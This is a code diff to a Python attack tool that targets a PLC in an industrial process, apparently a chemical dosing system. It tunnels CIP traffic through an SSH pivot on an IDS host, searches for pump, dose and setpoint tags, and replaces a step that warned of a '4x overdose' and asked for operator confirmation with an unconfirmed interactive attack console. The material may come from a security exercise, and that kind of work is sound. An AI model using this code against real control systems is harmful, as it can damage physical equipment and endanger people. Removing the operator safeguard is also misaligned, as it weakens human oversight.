@@ -1380,13 +1380,10 @@ def _open_cip_tunnel(
 
 
 def phase5_plc_attack() -> PhaseResult:
-    phase_header(5, "CIP Write Tag — PLC Dosage_Rate Manipulation")
+    phase_header(6, "Interactive CIP Attack Console")
     r = PhaseResult("PLC CIP Write")
 
     plc_ip   = CFG["plc"]["ip"]
-    tag      = CFG["plc"]["tag"]
-    safe_val = CFG["plc"]["safe_value"]
-    atk_val  = CFG["plc"]["attack_value"]
 
     hist_ip   = CFG["historian"]["ip"]
     hist_port = CFG["historian"]["port"]
@@ -1399,26 +1396,26 @@ def phase5_plc_attack() -> PhaseResult:
     ids_pass = CFG["ids"]["password"]
     ids_pkey: "paramiko.PKey | None" = CFG["ids"].get("private_key")
 
-    LOCAL_PORT  = 44818
-    INTERESTING = {"dose", "rate", "pump", "speed", "flow", "setpoint", "cmd", "hz", "local:"}
+    LOCAL_PORT    = 44818
+    INTERESTING   = {"dose", "rate", "pump", "speed", "flow", "setpoint", "cmd", "hz", "local:"}
     NUMERIC_TYPES = {"REAL", "DINT", "INT", "LINT", "SINT", "UDINT", "UINT"}
-    # Allen-Bradley ControlLogix CPUs can live in different backplane slots
-    CIP_SLOTS = ["", "/0", "/1", "/2", "/3"]
+    CIP_SLOTS     = ["", "/0", "/1", "/2", "/3"]
 
-    warn(f"This will write {tag} = {atk_val} (simulated 4x overdose) on PLC {plc_ip}")
-    warn(f"Strategy: native ssh -L  127.0.0.1:{LOCAL_PORT} → IDS ({ids_ip}) → PLC:{LOCAL_PORT}")
-    warn("MasterFlex pump will physically change behavior.")
-
-    console.print()
-    if not Confirm.ask("[red]Confirm attack write?[/red]", default=False):
-        r.status  = "skipped"
-        r.finding = "Skipped by operator"
-        return r
+    console.print(Panel(
+        "[bold white]Target :[/bold white] [bold yellow]{}[/bold yellow]\n"
+        "[dim]Establishing tunnel to initialize Interactive Attack Console...[/dim]".format(plc_ip),
+        title="[bold red] PLC Attack Module [/bold red]",
+        border_style="red", expand=False,
+    ))
 
     tunnel_proc: "subprocess.Popen | None" = None
     key_file:    "str | None"              = None
 
     try:
+        # ── Kill any ghost SSH proxy processes that could cause rate-limits ───
+        run_cmd("pkill -f 'ssh -W' 2>/dev/null || true",          capture=False)
+        run_cmd("pkill -f 'ssh -N -L 44818' 2>/dev/null || true", capture=False)
+
         # ── Spawn the real ssh -L tunnel ──────────────────────────────────────
         info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
         tunnel_proc, key_file = _open_cip_tunnel(
